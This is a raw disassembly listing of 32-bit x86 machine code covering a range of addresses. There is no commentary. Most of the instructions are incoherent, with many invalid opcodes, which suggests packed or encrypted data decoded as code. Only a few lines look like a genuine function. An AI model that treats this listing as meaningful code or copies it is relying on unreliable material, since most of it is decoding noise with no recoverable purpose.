  41c54c:	inc    ecx
  41c54d:	fs stos DWORD PTR es:[edi],eax
  41c54f:	mov    cl,0x17
  41c551:	cwde   
  41c552:	sub    cl,bh
  41c554:	aaa    
  41c555:	mov    ds:0x4095cc6f,al
  41c55a:	out    0x21,al
  41c55c:	es inc edi
  41c55e:	add    eax,0xa311866d
  41c563:	enter  0xe56e,0x82
  41c567:	cwde   
  41c568:	popf   
  41c569:	mov    ds:0xa45c4b2d,eax
  41c56e:	(bad)
  41c572:	lds    ebx,FWORD PTR [edx-0x33ab3f05]
  41c578:	or     dh,bh
  41c57a:	sub    al,0x93
  41c57c:	ins    BYTE PTR es:[edi],dx
  41c57d:	fisttp DWORD PTR [ebx-0x225f9624]
  41c583:	shl    BYTE PTR [ebx+0x1a55ee1a],0xc4
  41c58a:	(bad)  
  41c58b:	cmc    
  41c58c:	jne    0x41c5e5
  41c58e:	or     BYTE PTR [edi+0x1dd81507],dl
  41c594:	cmc    
  41c595:	popf   
  41c596:	pusha  
  41c597:	sbb    BYTE PTR [ebx+0x2f],al
  41c59a:	push   edi
  41c59b:	scas   al,BYTE PTR es:[di]
  41c59d:	ret    0x8a9
  41c5a0:	jmp    0x2f0b:0x5a857337
  41c5a7:	in     al,dx
  41c5a8:	mov    ebx,0xe7b623df
  41c5ad:	popa   
  41c5ae:	call   DWORD PTR [edx]
  41c5b0:	sbb    al,0xf1
  41c5b2:	and    BYTE PTR [esi+0x6ca83bc7],al
  41c5b8:	adc    BYTE PTR fs:[eax-0x3ecef990],0xfb
  41c5c0:	sub    al,0xb3
  41c5c2:	inc    esi
  41c5c3:	adc    DWORD PTR [ecx+0x4bb76479],ecx
  41c5c9:	aaa    
  41c5ca:	jmp    0xe46f62da
  41c5cf:	test   DWORD PTR [ebp-0x4ea29fc2],edx
  41c5d5:	sbb    eax,0x80b82909
  41c5da:	enter  0xc610,0x2a
  41c5de:	inc    ebp
  41c5df:	add    eax,0x3a319b67
  41c5e4:	mov    cl,0x29
  41c5e6:	sbb    al,0xba
  41c5e8:	mov    al,0xdf
  41c5ea:	push   esi
  41c5eb:	popf   
  41c5ec:	(bad)  
  41c5ed:	test   BYTE PTR [ecx],0xed
  41c5f0:	test   eax,0x16929d55
  41c5f5:	mov    esp,0x6a2f75e9
  41c5fa:	clc    
  41c5fb:	sub    al,0x70
  41c5fd:	pop    es
  41c5fe:	inc    esi
  41c5ff:	into   
  41c600:	ins    BYTE PTR es:[edi],dx
  41c601:	(bad)  
  41c603:	mov    esi,DWORD PTR [esi-0x3d403660]
  41c609:	cli    
  41c60a:	push   cs
  41c60b:	retf   
  41c60c:	add    eax,esp
  41c60e:	jo     0x41c689
  41c610:	(bad)  
  41c611:	jmp    0x6f8e85a9
  41c616:	dec    ebp
  41c617:	shl    esp,0xb9
  41c61a:	sbb    ch,BYTE PTR [edx-0x3a]
  41c61d:	stos   DWORD PTR es:[edi],eax
  41c61e:	fild   DWORD PTR [ebp-0x4b10f75]
  41c624:	in     al,dx
  41c625:	fldenv [esi]
  41c627:	mov    ss,WORD PTR [edi+ebx*8+0x3cd2e5b5]
  41c62e:	outs   dx,BYTE PTR ds:[esi]
  41c62f:	imul   esi,DWORD PTR [ebx],0x18292935
  41c635:	in     eax,0xfc
  41c637:	rcl    DWORD PTR [eax+0xd],0xd0
  41c63b:	stos   BYTE PTR es:[edi],al
  41c63c:	or     DWORD PTR [esi-0x45],0x45848743
  41c643:	popf   
  41c644:	push   0x86d8b1e9
  41c649:	imul   edi,DWORD PTR [ebx+0x54],0x36
  41c64d:	dec    edi
  41c64e:	jbe    0x41c682
  41c650:	sub    edx,DWORD PTR [ecx]
  41c652:	mov    edi,DWORD PTR [ecx+0x1b]
  41c655:	dec    edi
  41c656:	int3   
  41c657:	fnsave [edi-0x4c]
  41c65a:	ficomp WORD PTR [esp+eiz*2]
  41c65d:	jecxz  0x41c62f
  41c65f:	mov    bh,0x91
  41c661:	mov    esp,0xc9947faa
  41c666:	and    al,0x7d
  41c668:	rcl    ecx,cl
  41c66a:	not    DWORD PTR [ebp+0x714bfd23]
  41c670:	mov    DWORD PTR [ecx+ebp*1+0x3f22ff95],esi
  41c677:	imul   esi,DWORD PTR [ecx-0x23],0x4e463b45
  41c67e:	daa    
  41c67f:	aam    0xd3
  41c681:	cmp    BYTE PTR [edx+0x64591533],0xf7
  41c688:	fist   DWORD PTR [eax+0x24d160e3]
  41c68e:	mov    ch,0x47
  41c690:	mov    eax,0xd46f3a14
  41c695:	es out 0xd9,eax
  41c698:	scas   al,BYTE PTR es:[edi]
  41c699:	and    ecx,DWORD PTR [ecx+0x62f702b1]
  41c69f:	inc    edx
  41c6a0:	pop    edx
  41c6a1:	jg     0x41c676
  41c6a3:	leave  
  41c6a4:	jno    0x41c6d6
  41c6a6:	push   0x68fefefd
  41c6ab:	push   cs
  41c6ac:	outs   dx,BYTE PTR ds:[esi]
  41c6ad:	mov    edi,0x2df3e374
  41c6b2:	jb     0x41c635
  41c6b4:	inc    ebp
  41c6b5:	jb     0x41c6bf
  41c6b7:	iret   
  41c6b8:	cli    
  41c6b9:	clc    
  41c6ba:	or     BYTE PTR [ebx+0x4cdfa904],ch
  41c6c0:	sub    DWORD PTR ds:0xdaa13df2,esi
  41c6c6:	mov    esp,0x45a7cc50
  41c6cb:	jne    0x41c67a
  41c6cd:	xlat   BYTE PTR ds:[ebx]
  41c6ce:	daa    
  41c6cf:	and    dh,BYTE PTR [edi]
  41c6d1:	out    0x25,eax
  41c6d3:	aaa    
  41c6d4:	(bad)  
  41c6d5:	loopne 0x41c6eb
  41c6d7:	sti    
  41c6d8:	or     al,0x13
  41c6da:	mov    ah,0xa3
  41c6dc:	outs   dx,DWORD PTR ds:[esi]
  41c6dd:	adc    ebp,eax
  41c6df:	xor    al,0x4c
  41c6e1:	retf   0x39e0
  41c6e4:	dec    eax
  41c6e5:	pop    ebp
  41c6e6:	inc    esi
  41c6e7:	fisttp WORD PTR [eax+0x62]
  41c6ea:	ror    BYTE PTR [ebx-0x317b27ed],1
  41c6f0:	stc    
  41c6f1:	push   eax
  41c6f2:	inc    esi
  41c6f3:	pop    ebp
  41c6f4:	sub    BYTE PTR [esi],0xca
  41c6f7:	sbb    eax,0x621baaf5
  41c6fc:	repz mov ecx,0x853afa27
  41c702:	mov    ah,0xa6
  41c704:	bound  ecx,QWORD PTR [eax]
  41c706:	outs   dx,DWORD PTR ds:[esi]
  41c707:	xchg   ecx,eax
  41c708:	fstp   QWORD PTR ds:[edx-0x4a]
  41c70c:	push   ds
  41c70d:	das    
  41c70e:	pop    eax
  41c70f:	stc    
  41c710:	or     eax,0xc301f410
  41c715:	jmp    0xf3f5:0x95768823
  41c71c:	inc    esi
  41c71d:	sbb    esi,edi
  41c71f:	cwde   
  41c720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c721:	cdq    
  41c722:	mul    BYTE PTR [ecx]
  41c724:	sti    
  41c725:	xchg   esp,eax
  41c726:	out    0x2b,eax
  41c728:	lods   eax,DWORD PTR ds:[esi]
  41c729:	test   BYTE PTR [ebx+ebx*2+0x23],bh
  41c72d:	stc    
  41c72e:	(bad)  
  41c730:	retf   0xb8ba
  41c733:	rcl    BYTE PTR [edx],1
  41c735:	scas   al,BYTE PTR es:[edi]
  41c736:	mov    bl,0xce
  41c738:	and    ebp,eax
  41c73a:	add    bl,BYTE PTR [ebp+0x36]
  41c73d:	mov    esi,0x1c176b51
  41c742:	repnz fsubr DWORD PTR [ecx+0x45]
  41c746:	push   ss
  41c747:	mov    esp,0x1bdfe7fd
  41c74c:	mov    DWORD PTR [eax+0x645b7cb2],0x70aa597a
  41c756:	dec    ebp
  41c757:	in     al,0x2
  41c759:	div    BYTE PTR [ebx+0x218f9da0]
  41c75f:	stc    
  41c760:	jmp    0xa4af:0x280f5f2
  41c767:	(bad)  
  41c768:	aas    
  41c769:	arpl   WORD PTR [ecx-0x56],cx
  41c76c:	outs   dx,BYTE PTR ds:[esi]
  41c76d:	sbb    DWORD PTR [ecx-0x24e47c7],eax
  41c773:	push   ds
  41c774:	dec    esp
  41c775:	lock ds push ebx
  41c778:	je     0x41c793
  41c77a:	or     DWORD PTR [ecx],esp
  41c77c:	cmp    al,0xa8
  41c77e:	outs   dx,DWORD PTR ds:[esi]
  41c77f:	stc    
  41c780:	ja     0x41c77e
  41c782:	in     al,dx
  41c783:	cmp    al,BYTE PTR [ecx-0x14207c5b]
  41c789:	inc    ebx
  41c78a:	call   0x9571f455
  41c78f:	cli    
  41c790:	lock call ecx
  41c793:	cmc    
  41c794:	scas   al,BYTE PTR es:[edi]
  41c795:	fidivr WORD PTR [esi-0x566ed3a9]
  41c79b:	cmp    al,0xb4
  41c79d:	pop    es
  41c79e:	ss cld 
  41c7a0:	js     0x41c802
  41c7a2:	sahf   
  41c7a3:	pop    ecx
  41c7a4:	loopne 0x41c7be
  41c7a6:	in     eax,dx
  41c7a7:	lea    ecx,[ebx-0x4d]
  41c7aa:	push   ss
  41c7ab:	push   0xc613c1b9
  41c7b0:	daa    
  41c7b1:	rol    DWORD PTR [ebx],1
  41c7b3:	sub    bl,BYTE PTR [ebx+0x60c86662]
  41c7b9:	mov    BYTE PTR [ebp-0x73d519e0],ah
  41c7bf:	nop
  41c7c0:	js     0x41c7d3
  41c7c2:	xor    DWORD PTR [eax],esi
  41c7c4:	cwde   
  41c7c5:	repnz mov edx,0xb88f5eec
  41c7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7cc:	test   eax,0xceb2065
  41c7d1:	enter  0xe215,0x65
  41c7d5:	movd   mm5,ecx
  41c7d8:	test   dl,0xa
  41c7db:	stos   BYTE PTR es:[edi],al
  41c7dc:	jb     0x41c794
  41c7de:	mov    BYTE PTR [ebx],cl
  41c7e0:	xchg   esp,eax
  41c7e1:	adc    al,0xad
  41c7e3:	dec    edi
  41c7e4:	xchg   esp,eax
  41c7e5:	popa   
  41c7e6:	pop    edi
  41c7e7:	movd   mm2,DWORD PTR [edx]
  41c7ea:	pop    eax
  41c7eb:	std    
  41c7ec:	outs   dx,BYTE PTR ds:[esi]
  41c7ed:	mov    ds:0xdbbfcfe8,eax
  41c7f2:	stos   BYTE PTR es:[edi],al
  41c7f3:	std    
  41c7f4:	xchg   esi,eax
  41c7f5:	js     0x41c77e
  41c7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7f8:	rol    BYTE PTR [ebp+0x39ccad7b],0xb
  41c7ff:	push   ecx
  41c800:	sbb    al,0xc3
  41c802:	bound  esi,QWORD PTR [ebx]
  41c804:	adc    BYTE PTR [ecx-0x62],bh
  41c807:	inc    esi
  41c808:	dec    ebp
  41c809:	in     al,0xb3
  41c80b:	dec    edi
  41c80c:	inc    edi
  41c80d:	pop    ecx
  41c80e:	std    
  41c80f:	cdq    
  41c810:	in     al,dx
  41c811:	sbb    dh,bh
  41c813:	retf   
  41c814:	in     al,dx
  41c815:	sbb    eax,0x6f865fc5
  41c81a:	push   esp
  41c81b:	cli    
  41c81c:	addr16 sub bl,al
  41c81f:	jmp    0x6f0e1bee
  41c824:	push   ebx
  41c825:	push   eax
  41c826:	push   ss
  41c827:	pushf  
  41c828:	or     eax,eax
  41c82a:	sub    BYTE PTR [esi-0x19e02b62],dl
  41c830:	mov    esp,0xcb74d843
  41c835:	mov    bl,0x61
  41c837:	jno    0x41c850
  41c839:	fistp  DWORD PTR [ebx]
  41c83b:	jg     0x41c7e4
  41c83d:	sbb    eax,0xca64b39d
  41c842:	adc    eax,0x5490f02d
  41c847:	in     eax,0xc7
  41c849:	rcl    ebx,0x2f
  41c84c:	mov    eax,0x1f15a08e
  41c851:	cli    
  41c852:	inc    edx
  41c853:	mov    bh,0x6c
  41c855:	xor    dl,BYTE PTR [edi+0x1e]
  41c858:	sti    
  41c859:	jp     0x41c89c
  41c85b:	pop    ds
  41c85c:	and    al,0x3c
  41c85e:	pop    edi
  41c85f:	push   ecx
  41c860:	push   ebp
  41c861:	cmp    BYTE PTR [edx],cl
  41c863:	out    dx,eax
  41c864:	sbb    eax,0xcf7efdc
  41c869:	lods   al,BYTE PTR ds:[esi]
  41c86a:	dec    ebx
  41c86b:	mov    ecx,0x60721361
  41c870:	pop    DWORD PTR [ecx*4+0x51c1958]
  41c877:	pusha  
  41c878:	sbb    eax,DWORD PTR [edx+esi*4]
  41c87b:	lods   al,BYTE PTR ds:[esi]
  41c87c:	cdq    
  41c87d:	sbb    ch,al
  41c87f:	sbb    eax,0x1a6212bd
  41c884:	mov    BYTE PTR [edi],bh
  41c886:	mov    edx,0x99cbd85d
  41c88b:	out    0x37,eax
  41c88d:	and    ah,BYTE PTR [ebx+0x62]
  41c890:	cmp    DWORD PTR [ebx-0x14be7e21],ebx
  41c896:	mov    eax,0x79be2250
  41c89b:	cwde   
  41c89c:	xor    dl,bh
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xaba388e2
  41c8c2:	dec    ecx
  41c8c3:	imul   ebp,DWORD PTR [edi-0x51fffe7b],0x8b000000
  41c8cd:	ficomp WORD PTR gs:[ecx-0x4f]
  41c8d1:	out    dx,al
  41c8d2:	in     eax,0x72
  41c8d4:	int    0xad
  41c8d6:	jns    0x41c8c1
  41c8d8:	loop   0x41c905
  41c8da:	or     al,0x4b
  41c8dc:	xor    cl,dh
  41c8de:	cs jnp 0x41c87f
  41c8e1:	sbb    ch,BYTE PTR [ebp+0x2be286e2]
  41c8e7:	in     eax,dx
  41c8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e9:	sbb    BYTE PTR [ebp-0x11],bh
  41c8ec:	imul   ecx,DWORD PTR [ebp-0x7b],0xffffffcd
  41c8f0:	nop
  41c8f1:	(bad)  
  41c8f2:	or     ch,0xa9
  41c8f5:	xor    esi,DWORD PTR [ecx]
  41c8f7:	mov    cl,0x4f
  41c8f9:	dec    eax
  41c8fa:	repnz add edx,DWORD PTR [ecx+ecx*2+0x21]
  41c8ff:	lods   eax,DWORD PTR ds:[esi]
  41c900:	jl     0x41c97a
  41c902:	fs adc bl,0x13
  41c906:	sahf   
  41c907:	adc    dh,BYTE PTR [ecx+0x1a]
  41c90a:	loope  0x41c956
  41c90c:	mov    dl,0x1a
  41c90e:	leave  
  41c90f:	jbe    0x41c986
  41c911:	mov    dl,0xdb
  41c913:	popa   
  41c914:	fs xchg esp,eax
  41c916:	mov    bh,0xc
  41c918:	jmp    0x41c8f4
  41c91a:	cwde   
  41c91b:	fs or  al,0xe
  41c91e:	add    DWORD PTR [ebp+eiz*1-0x77ad2287],esp
  41c925:	fdiv   st,st(5)
  41c927:	pusha  
  41c928:	icebp  
  41c929:	lahf   
  41c92a:	jl     0x41c97e
  41c92c:	rcr    DWORD PTR [bx+di-0x2a72],1
  41c931:	loope  0x41c93f
  41c933:	repz push 0xffffffb8
  41c936:	clc    
  41c937:	adc    bh,BYTE PTR [esi-0x34cf2077]
  41c93d:	add    edi,DWORD PTR [ecx]
  41c93f:	add    DWORD PTR [ebx+0x7a],esp
  41c942:	test   DWORD PTR [edi-0x2379c8a5],esp
  41c948:	sbb    eax,0x9e174d49
  41c94d:	cmp    BYTE PTR [eax+0x6f816067],dl
  41c953:	aam    0x1a
  41c955:	(bad)  
  41c956:	jno    0x41c92c
  41c958:	dec    esi
  41c959:	dec    ebx
  41c95a:	jns    0x41c999
  41c95c:	das    
  41c95d:	(bad)  
  41c95e:	and    edi,edi
  41c960:	mov    cl,0xdc
  41c962:	pop    eax
  41c963:	dec    esp
  41c965:	mov    BYTE PTR [ebx+0x79],al
  41c968:	adc    eax,0x42cee663
  41c96d:	inc    ecx
  41c96e:	mov    eax,ds:0x56c7c28c
  41c973:	jae    0x41c9ee
  41c975:	adc    DWORD PTR [edi+0x8aab4e],edx
	...
  41c983:	add    cl,dl
  41c985:	sub    al,0x14
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x88ae47b1
  41c994:	pop    ebp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [esi+0x4000000],ch
  41c99d:	out    0xcb,al
  41c99f:	(bad)  
  41c9a0:	sub    BYTE PTR [esi],ch
  41c9a2:	mov    al,ds:0x5565d465
  41c9a7:	xchg   ebp,eax
  41c9a8:	xchg   esp,eax
  41c9a9:	mov    esi,0xd315e131
  41c9ae:	sbb    DWORD PTR [ecx],0xffffff89
  41c9b1:	lds    ebp,FWORD PTR [esi+0x3f]
  41c9b4:	int3   
  41c9b5:	(bad)  
  41c9b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b8:	call   0xebbe39c7
  41c9bd:	sbb    eax,0x1130dd87
  41c9c2:	add    BYTE PTR [esi+ebp*4-0xc],dh
  41c9c6:	pop    edi
  41c9c7:	push   0x51d351a5
  41c9cc:	push   edx
  41c9cd:	or     ebp,DWORD PTR [eax]
  41c9cf:	jmp    0x41c9b3
  41c9d1:	pop    ds
  41c9d2:	mov    ds,WORD PTR [ebx]
  41c9d4:	inc    ebx
  41c9d5:	cdq    
  41c9d6:	test   edi,ebp
  41c9d8:	inc    eax
  41c9d9:	adc    al,0x36
  41c9db:	fiadd  WORD PTR [edx]
  41c9dd:	out    dx,eax
  41c9de:	add    eax,0xb3eb900b
  41c9e3:	mov    eax,ds:0x56df4d25
  41c9e8:	cmc    
  41c9e9:	cwde   
  41c9ea:	push   esp
  41c9eb:	daa    
  41c9ec:	push   esi
  41c9ed:	std    
  41c9ee:	push   edx
  41c9ef:	mov    ecx,0x2642c487
  41c9f4:	outs   dx,BYTE PTR ds:[esi]
  41c9f5:	pop    ebx
  41c9f6:	cwde   
  41c9f7:	pop    esi
  41c9f8:	out    dx,al
  41c9f9:	xor    al,0x23
  41c9fb:	push   0x7c
  41c9fd:	arpl   WORD PTR [esi+eiz*1+0x51],cx
  41ca01:	sbb    al,0x8
  41ca03:	jmp    0xb8d2cd4f
  41ca08:	iret   
  41ca09:	cmp    al,0x79
  41ca0b:	cmp    BYTE PTR [ecx-0x373c92c4],bl
  41ca11:	push   0x7d
  41ca13:	mov    dh,0x1c
  41ca15:	mov    esi,0x38effb2e
  41ca1a:	dec    edx
  41ca1b:	cdq    
  41ca1c:	adc    BYTE PTR [ebp+0x440f8e06],ah
  41ca22:	shl    esi,1
  41ca24:	enter  0x5041,0x27
  41ca28:	sub    al,0xd0
  41ca2a:	fsubr  st(7),st
  41ca2c:	clc    
  41ca2d:	dec    edx
  41ca2e:	push   edi
  41ca2f:	xchg   edx,eax
  41ca30:	into   
  41ca31:	push   es
  41ca32:	aad    0xe4
  41ca34:	dec    eax
  41ca35:	pop    ecx
  41ca36:	popa   
  41ca37:	addr16 sub ecx,ebp
  41ca3a:	xor    BYTE PTR ds:0x1315a9f3,bh
  41ca40:	or     al,0xef
  41ca42:	sub    BYTE PTR [edx+0x5c],dl
  41ca45:	jg     0x41ca81
  41ca47:	(bad)  [ebx+0xe]
	...
  41ca52:	add    BYTE PTR [eax],al
  41ca54:	pop    ds
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x5d936683],0xb
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [esi-0x41000000],ch
  41ca6d:	mov    BYTE PTR [esi],bh
  41ca6f:	inc    ecx
  41ca70:	push   eax
  41ca71:	xchg   edx,eax
  41ca72:	sub    dh,ch
  41ca74:	inc    ebp
  41ca75:	add    ah,BYTE PTR [edi-0x4e]
  41ca78:	vpmaddwd xmm3,xmm5,xmm4
  41ca7c:	(bad)  
  41ca7d:	loopne 0x41ca18
  41ca7f:	je     0x41ca14
  41ca81:	scas   al,BYTE PTR es:[edi]
  41ca82:	mov    dh,0x46
  41ca84:	mov    fs,WORD PTR [esi+0x3eb08164]
  41ca8a:	push   0xffffffcf
  41ca8c:	jecxz  0x41cafc
  41ca8e:	pop    edi
  41ca8f:	and    edx,DWORD PTR [ecx]
  41ca91:	push   edi
  41ca92:	adc    eax,0x2af0495a
  41ca97:	mov    eax,ds:0x8c91e65c
  41ca9c:	dec    edx
  41ca9d:	push   ebx
  41ca9e:	and    cl,BYTE PTR [ecx+0x6704d09]
  41caa4:	xchg   DWORD PTR [edx-0x444374a7],edi
  41caaa:	hlt    
  41caab:	jne    0x41cae0
  41caad:	leave  
  41caae:	cs xchg esp,eax
  41cab0:	aam    0x7b
  41cab2:	jecxz  0x41ca3e
  41cab4:	sub    BYTE PTR [esi],bh
  41cab6:	mov    ah,0x7d
  41cab8:	std    
  41cab9:	jge    0x41cb0c
  41cabb:	les    ecx,FWORD PTR [esi-0x139b5037]
  41cac1:	(bad)
  41cac4:	mov    BYTE PTR [eax-0x6c],0x95
  41cac8:	les    eax,FWORD PTR [ecx]
  41caca:	cmp    dl,bh
  41cacc:	test   esi,edi
  41cace:	mov    edi,DWORD PTR [edx+0x79]
  41cad1:	pop    esi
  41cad2:	test   DWORD PTR [esi+eax*2-0x7a],edx
  41cad6:	xchg   bh,dh
  41cad8:	cli    
  41cad9:	jmp    0x2ff4:0x6f49d22
  41cae0:	fidiv  DWORD PTR [ecx-0x4cb4d8f6]
  41cae6:	fsubr  DWORD PTR [esi-0xe20ede0]
  41caec:	clc    
  41caed:	or     BYTE PTR [edx+eiz*1-0x49],bl
  41caf1:	inc    edi
  41caf2:	add    DWORD PTR [ecx+0x345d1344],edi
  41caf8:	aam    0x30
  41cafa:	icebp  
  41cafb:	mov    esp,0x8b0793c5
  41cb00:	add    eax,0xf9e1f513
  41cb05:	sahf   
  41cb06:	mov    dl,0x2
  41cb08:	sahf   
  41cb09:	dec    edx
  41cb0a:	mov    edx,?
  41cb0c:	jle    0x41cb3e
  41cb0e:	mov    edi,0xcd4da813
  41cb13:	mov    ds:0xcc06cd0,eax
  41cb18:	pop    DWORD PTR [ecx+0x0]
	...
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	mov    ch,0x97
  41cb32:	sar    BYTE PTR [edi+0x187b9],1
  41cb38:	scas   al,BYTE PTR es:[edi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [ecx-0x3e],dh
  41cb3e:	cmp    DWORD PTR [ebx+0x70264bfe],edi
  41cb44:	lds    ebp,FWORD PTR [eax+0x124a38cc]
  41cb4a:	in     al,dx
  41cb4b:	dec    eax
  41cb4c:	daa    
  41cb4d:	mov    ds:0x4083b75f,al
  41cb52:	sahf   
  41cb53:	cmp    eax,0xe4634782
  41cb58:	sahf   
  41cb59:	into   
  41cb5a:	pop    ebp
  41cb5b:	cs and eax,0xc5f10834
  41cb61:	cmp    al,0x2
  41cb63:	pop    edx
  41cb64:	sbb    BYTE PTR [esi-0x770d17bf],bl
  41cb6a:	gs and eax,0x341f5c3e
  41cb70:	jecxz  0x41cb46
  41cb72:	xor    ecx,DWORD PTR [edi+0x2d]
  41cb75:	dec    ecx
  41cb76:	pop    ds
  41cb77:	dec    esp
  41cb78:	iret   
  41cb79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb7a:	and    eax,0x1600fcaf
  41cb7f:	xlat   BYTE PTR ds:[ebx]
  41cb80:	sub    BYTE PTR [ebx-0x2912590f],0x23
  41cb87:	pusha  
  41cb88:	and    al,0x2
  41cb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb8b:	sub    cl,cl
  41cb8d:	mov    cl,0x89
  41cb8f:	popa   
  41cb90:	dec    edx
  41cb91:	std    
  41cb92:	sbb    BYTE PTR [edx-0x33],bh
  41cb95:	int    0x81
  41cb97:	inc    ebx
  41cb98:	xor    cl,cl
  41cb9a:	inc    esi
  41cb9b:	or     BYTE PTR [ebx],bh
  41cb9d:	xchg   bl,bl
  41cb9f:	ss gs jne 0x41cb3d
  41cba3:	mov    al,0x8a
  41cba5:	retf   0x7036
  41cba8:	std    
  41cba9:	mov    dl,0xe2
  41cbab:	fwait
  41cbac:	adc    ch,al
  41cbae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbaf:	or     DWORD PTR [edi+edi*4],esp
  41cbb2:	iret   
  41cbb3:	mov    eax,ds:0x2581dea6
  41cbb8:	jp     0x41cbc4
  41cbba:	xor    bl,BYTE PTR [eax-0x8c0eb87]
  41cbc0:	rcr    dl,cl
  41cbc2:	bound  ebx,QWORD PTR [di]
  41cbc5:	int    0xa8
  41cbc7:	pop    ds
  41cbc8:	ret    0x359d
  41cbcb:	or     eax,0xa6af9fd1
  41cbd0:	pop    ebp
  41cbd1:	scas   eax,DWORD PTR es:[edi]
  41cbd2:	cmc    
  41cbd3:	scas   eax,DWORD PTR es:[edi]
  41cbd4:	or     eax,0xffcbafa3
  41cbd9:	and    esi,eax
  41cbdb:	or     eax,0x979e0b95
  41cbe0:	sbb    dl,BYTE PTR [esi-0x67bdd5d9]
  41cbe6:	(bad)  
  41cbe7:	mov    cl,0xa9
  41cbe9:	cld    
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x73a58aa3,al
  41cc04:	mov    BYTE PTR [bx+di],al
  41cc07:	add    BYTE PTR [esi+0x34000000],ch
  41cc0d:	ss dec ebp
  41cc0f:	ja     0x41cc7d
  41cc11:	and    ch,bh
  41cc13:	(bad)  
  41cc14:	int    0xff
  41cc16:	aam    0xda
  41cc18:	ret    
  41cc19:	xchg   BYTE PTR ds:0x73da6d14,ch
  41cc1f:	dec    ebp
  41cc20:	xlat   BYTE PTR ds:[ebx]
  41cc21:	pop    edi
  41cc22:	pop    esp
  41cc23:	add    al,0x81
  41cc25:	mov    DWORD PTR [edi+0x14],edx
  41cc28:	cs xchg ecx,eax
  41cc2a:	xchg   ecx,eax
  41cc2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc2c:	pop    esi
  41cc2d:	pushf  
  41cc2e:	(bad)  
  41cc30:	mov    BYTE PTR [edi-0x498e3317],bl
  41cc36:	imul   edx,DWORD PTR [esi],0x6
  41cc39:	popf   
  41cc3a:	mov    al,ah
  41cc3c:	dec    ebp
  41cc3d:	xchg   ecx,eax
  41cc3e:	cmp    BYTE PTR [edi+0x2a],cl
  41cc41:	and    DWORD PTR [ebx+0x4881b9c0],eax
  41cc47:	adc    eax,0x5f6867dd
  41cc4c:	pop    ss
  41cc4d:	mov    WORD PTR [ebp-0x11049242],es
  41cc53:	add    dl,BYTE PTR [esi-0x2f38f4a9]
  41cc59:	std    
  41cc5a:	mov    edi,0xf3d1c8f9
  41cc5f:	mov    al,0xfb
  41cc61:	pop    ebx
  41cc62:	mov    edi,0xf3050b8b
  41cc67:	js     0x41cc39
  41cc69:	aam    0xa3
  41cc6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc6c:	test   eax,0x53a45576
  41cc71:	xchg   esp,eax
  41cc72:	or     al,0x70
  41cc74:	dec    esp
  41cc75:	inc    esi
  41cc76:	xchg   esp,eax
  41cc77:	imul   edx,ebp,0x1e17f265
  41cc7d:	inc    eax
  41cc7e:	ror    DWORD PTR [eax],cl
  41cc80:	into   
  41cc81:	data16 arpl cx,cx
  41cc84:	lahf   
  41cc85:	push   cs
  41cc86:	or     eax,edi
  41cc88:	mov    esi,0x81dee81e
  41cc8d:	out    dx,al
  41cc8e:	pop    ds
  41cc8f:	mov    edx,0x8458cf02
  41cc94:	scas   al,BYTE PTR es:[edi]
  41cc95:	mov    eax,ds:0x504028fb
  41cc9a:	adc    eax,0x372bd46
  41cc9f:	or     dl,bl
  41cca1:	xor    al,0xe0
  41cca3:	mov    fs,edx
  41cca5:	dec    ecx
  41cca6:	add    eax,0x7ddbb4f3
  41ccab:	dec    eax
  41ccac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccad:	lds    ebx,FWORD PTR [edi+0x6bcb23cb]
  41ccb3:	adc    DWORD PTR [ebx+0x38],ebx
  41ccb6:	add    esi,eax
  41ccb8:	(bad)  
  41ccb9:	retf   0x0
	...
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	pop    edi
  41ccd1:	sub    al,0xd
  41ccd3:	not    BYTE PTR ds:0xae000189
  41ccd9:	add    BYTE PTR [eax],al
  41ccdb:	add    BYTE PTR [edx+0x64],dh
  41ccde:	mov    ds:0xad18339a,al
  41cce3:	cdq    
  41cce4:	xor    DWORD PTR [esi],edx
